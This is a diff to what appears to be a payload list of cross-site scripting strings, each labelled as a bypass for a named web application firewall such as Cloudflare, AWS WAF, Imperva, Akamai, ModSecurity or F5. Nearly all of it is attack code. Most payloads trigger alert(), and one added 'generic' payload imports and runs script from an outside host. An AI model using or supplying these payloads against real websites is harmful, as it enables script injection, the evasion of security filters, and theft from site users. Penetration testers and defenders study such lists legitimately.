@@ -1,33 +1,48 @@
-Cloudflear bypass payload 
+===> Cloudflear bypass payload 
 
 <img src=x onerror=(a=alert,b=1,a(b))>
 
 <input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()">
 <label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
 
-AWS WAF bypass payload 
+<Image Src=//X55.is OnLoad%0C=import(Src)//
+
+===> AWS WAF bypass payload 
 
 <img src=x onerror=(a=alert,b=1,a(b))>
 
-Imperva bypass payload 
+<Img Src=OnXSS OnError=(alert)(1)>
+
+===> Imperva bypass payload 
 
 1'//"</Script><Img/Src%0AOnError=alert(1)//
 
-Sucuri bypass payload 
+===> Sucuri bypass payload 
 
 1'//"</Script><Img/Src%0AOnError=alert(1)//
 
-Akamai bypass payload 
+===> Akamai bypass payload 
 
 1'//"</Script><Img/Src%0AOnError=alert(1)//
 
-ModSecurity bypass payload 
+<A Href AutoFocus %252F="/"OnFocus=k='t',top >
+
+===> ModSecurity bypass payload 
 
 <input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()">
 <label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
 
-F5 bypass payload 
+<A Href AutoFocus %252F="/"OnFocus=k='t',top >
+
+===> F5 bypass payload 
 
 <input type="checkbox" id="z" value="xss0r" style="display:none" &%2362;="" onchange="top[['alert'][0]](location.hostname);this.remove()">
 <label for="z" style="position:fixed;inset:0;cursor:crosshair"></label>
 
+===> Barracuda bypass payload 
+
+<Img Src=OnXSS OnError=(alert)(1)>
+
+===> Generic bypass payload 
+
+<Image Src=//X55.is OnLoad%0C=import(Src)//
